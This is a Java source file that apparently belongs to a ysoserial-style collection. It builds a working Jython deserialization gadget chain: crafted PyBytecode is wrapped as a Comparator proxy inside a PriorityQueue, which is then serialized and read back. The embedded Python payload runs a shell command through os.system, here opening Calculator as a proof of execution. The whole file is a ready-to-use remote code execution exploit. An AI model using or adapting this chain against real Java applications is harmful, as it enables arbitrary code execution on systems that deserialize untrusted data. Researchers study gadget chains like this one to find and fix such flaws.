package org.su18.serialize.ysoserial.Jython;

import org.python.core.*;
import org.su18.serialize.utils.SerializeUtil;

import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;

/**
 * @author su18
 */
public class Jython {

	public static void main(String[] args) throws Exception {

		String path = "/Users/phoebe/Downloads/123.py";
		String code = "import os\nos.system('open -a Calculator.app')";

		String pythonByteCode = "7400006401006402008302007D00007C0000690100640300830100017C0000690200830000017403006401008301000164000053";

		// 初始化参数
		PyObject[] consts = new PyObject[]{new PyString(""), new PyString(path), new PyString("w+"), new PyString(code)};
		String[]   names  = new String[]{"open", "write", "close", "execfile"};

		// 初始化 PyBytecode
		PyBytecode bytecode = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{"", ""}, "noname", "<module>", 0, "");
		Field      field    = PyBytecode.class.getDeclaredField("co_code");
		field.setAccessible(true);
		field.set(bytecode, new BigInteger(pythonByteCode, 16).toByteArray());

		// 使用 PyBytecode 初始化 PyFunction
		PyFunction handler = new PyFunction(new PyStringMap(), null, bytecode);

		// 使用 PyFunction 代理 Comparator
		Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

		PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
		Object[]              queue         = new Object[]{path, code};

		Field queueField = PriorityQueue.class.getDeclaredField("queue");
		queueField.setAccessible(true);
		queueField.set(priorityQueue, queue);

		Field sizeField = PriorityQueue.class.getDeclaredField("size");
		sizeField.setAccessible(true);
		sizeField.set(priorityQueue, 2);

		SerializeUtil.writeObjectToFile(priorityQueue);
		SerializeUtil.readFileObject();

	}

}
